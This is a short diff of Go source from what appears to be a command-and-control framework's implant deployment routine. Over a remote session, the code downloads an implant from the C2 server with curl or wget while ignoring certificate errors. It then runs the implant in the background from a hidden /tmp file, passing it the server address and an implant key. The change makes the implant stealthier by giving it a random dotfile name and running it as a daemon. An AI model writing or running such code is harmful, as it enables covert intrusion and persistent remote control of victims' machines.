@@ -245,13 +245,13 @@ func (e *Engine) deployFromServer(campID, user, pass, target string, port int) {
 	arch := strings.TrimSpace(string(archOut))
 	log.Printf("[*] Deploy to %s: detected arch %s", addr, arch)
 
-	rname := fmt.Sprintf("/tmp/.sysmon-%d", time.Now().UnixNano()%100000)
+	rname := fmt.Sprintf("/tmp/.%x", time.Now().UnixNano()%0xFFFFFF)
 
 	downloadCmd := fmt.Sprintf(
 		`curl -sk -o %s '%s/api/v1/agent/binary?arch=%s' 2>/dev/null || wget -q --no-check-certificate -O %s '%s/api/v1/agent/binary?arch=%s' 2>/dev/null`,
 		rname, e.c2URL, arch, rname, e.c2URL, arch)
 	startCmd := fmt.Sprintf(
-		"chmod +x %s && nohup %s --server '%s' --implant-key '%s' --interval 10s --jitter 2s >/dev/null 2>&1 & echo $!",
+		"chmod +x %s && nohup %s --server '%s' --implant-key '%s' --daemon >/dev/null 2>&1 & echo $!",
 		rname, rname, e.c2URL, e.implantKey)
 
 	session, err := conn.NewSession()
